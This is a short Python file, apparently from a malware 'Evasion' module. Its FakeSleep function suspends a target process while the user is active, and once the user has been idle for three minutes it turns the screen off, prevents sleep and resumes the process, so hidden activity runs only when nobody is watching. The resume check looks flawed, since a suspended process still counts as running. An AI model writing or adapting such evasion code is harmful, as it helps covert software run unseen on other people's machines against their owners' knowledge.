import time
from Evasion.backup.utils import get_idle_duration,turn_screen_off,prevent_sleep
import psutil
"""
//TODO: import from Evasion.utils and not backup
//TODO: find a way to check if screen is on or off, turn it on if get_idle_duration < 180
What this function should do -->
this should run as individual process --> not child!.
1. GET MAIN PROCESS PID!
2. monitor get_idle duration
3. if get_idle_duration < 180: suspend the main PID.
4. if get_idle_duration > 180 (3 min), turn screen off, prevent sleep,resume pid 
"""

def FakeSleep(main_pid):
    while 0x001:
        our_process = psutil.Process(pid=main_pid)
        while get_idle_duration() < 180:
            time.sleep(0.5)
            if our_process.is_running():
                our_process.suspend()
            continue
        turn_screen_off()
        prevent_sleep()
        if not our_process.is_running():
            #//TODO: check if .is_running() also count as .is_resumed()
            psutil.Process(pid=main_pid).resume()
        time.sleep(0.5)
        #PERF ISSUE..?
